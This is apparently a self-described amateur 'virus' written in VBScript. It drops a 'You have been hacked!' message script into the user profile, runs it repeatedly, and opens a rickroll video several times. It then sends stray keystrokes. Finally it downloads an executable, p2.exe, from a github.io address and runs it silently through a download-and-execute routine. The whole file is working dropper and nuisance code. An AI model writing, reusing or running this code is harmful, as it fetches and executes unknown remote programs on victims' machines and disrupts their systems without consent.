'Yes I know, skid level "virus"
Function DownloadAndRunAsync(url, savePath)
    ' Create an XMLHTTP object to handle the download
    Dim http
    Set http = CreateObject("MSXML2.XMLHTTP")
    
    ' Open the request to the specified URL
    http.Open "GET", url, True ' True for asynchronous
    
    ' Send the request
    http.Send
    
    ' Wait for the request to complete
    Do While http.readyState <> 4
        WScript.Sleep 50
    Loop
    
    ' Check if the request was successful
    If http.Status = 200 Then
        ' Create a binary stream to save the downloaded file
        Dim stream
        Set stream = CreateObject("ADODB.Stream")
        
        ' Open the stream and write the downloaded data
        stream.Open
        stream.Type = 1 ' Binary
        stream.Write http.responseBody
        stream.SaveToFile savePath, 2 ' 2 = overwrite existing file
        stream.Close
        
        ' Run the downloaded program asynchronously
        Dim shell
        Set shell = CreateObject("WScript.Shell")
        shell.Run savePath, 1, False ' 1 = window style, False = run asynchronously
        
        ' Return success
        DownloadAndRunAsync = True
    Else
        ' Return failure
        DownloadAndRunAsync = False
    End If
End Function

Set objShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' Get the user's profile folder path
profilePath = objShell.ExpandEnvironmentStrings("%USERPROFILE%")

fileName = "o.vbs"
filePath = fso.BuildPath(profilePath, fileName)
Set file = fso.CreateTextFile(filePath, True)

file.WriteLine("MsgBox ""You have been hacked!"", vbCritical, ""Error""")

file.Close
WScript.sleep(300000)
For i = 1 To 10
	WScript.Sleep(90)
	objShell.Run "wscript "+filePath, 1, False
Next
WScript.Sleep(500)
For i = 1 To 3
	objShell.Run "https://shattereddisk.github.io/rickroll/rickroll.mp4"
Next
For i = 1 To 50
	WScript.Sleep(15)
	objShell.SendKeys("¯")
Next
WScript.Sleep(4000)
fileName = "p2.exe"
filePath = fso.BuildPath(profilePath, fileName)
If Not DownloadAndRunAsync("https://stelios333.github.io/e/p2.exe", filePath) Then
    WScript.Echo "Something went wrong."
End If